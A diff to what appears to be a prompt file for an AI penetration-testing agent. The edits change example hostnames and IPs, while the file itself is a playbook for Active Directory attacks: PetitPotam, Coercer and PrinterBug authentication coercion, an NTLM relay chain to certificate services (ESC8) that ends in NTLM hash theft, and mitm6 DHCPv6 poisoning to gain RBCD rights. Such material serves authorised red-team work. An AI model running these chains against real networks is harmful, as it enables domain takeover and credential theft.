@@ -74,8 +74,8 @@ Captures:
 Coerce DC to authenticate:
 ```
 petitpotam(
-    target="dc.corp.local",
-    listener="192.168.56.100"
+    target="dc.contoso.local",
+    listener="192.168.58.100"
 )
 ```
 
@@ -88,8 +88,8 @@ Use cases:
 Try multiple coercion methods:
 ```
 coercer(
-    target="server.corp.local",
-    listener="192.168.56.100"
+    target="server.contoso.local",
+    listener="192.168.58.100"
 )
 ```
 
@@ -104,8 +104,8 @@ Tries:
 Specific printer coercion:
 ```
 printerbug(
-    target="server.corp.local",
-    listener="192.168.56.100"
+    target="server.contoso.local",
+    listener="192.168.58.100"
 )
 ```
 
@@ -113,8 +113,8 @@ printerbug(
 
 ### For ADCS ESC8
 You handle the full ESC8 attack chain:
-1. Start `ntlmrelayx_to_adcs(ca_host="ca.domain.local", attacker_ip="YOUR_IP")`
-2. Run `petitpotam(target="dc.domain.local", listener="YOUR_IP")` to coerce DC
+1. Start `ntlmrelayx_to_adcs(ca_host="ca.contoso.local", attacker_ip="YOUR_IP")`
+2. Run `petitpotam(target="dc.contoso.local", listener="YOUR_IP")` to coerce DC
 3. DC authenticates to relay, relay requests certificate from CA
 4. Certificate is saved, use `certipy_auth` (on privesc) to get NTLM hash
 
@@ -137,7 +137,7 @@ Relay to multiple SMB targets from a targets file:
 ### DHCPv6 + LDAP Relay (Create Computer for RBCD)
 Combine mitm6 with ntlmrelayx to create computer account:
 ```
-1. start_mitm6(domain="domain.com", interface="")
+1. start_mitm6(domain="contoso.local", interface="")
    → Poison DHCPv6 responses
 2. ntlmrelayx_to_ldaps(dc_ip="192.168.58.10", delegate_access=True)
    → Relay to LDAPS, create computer with RBCD rights
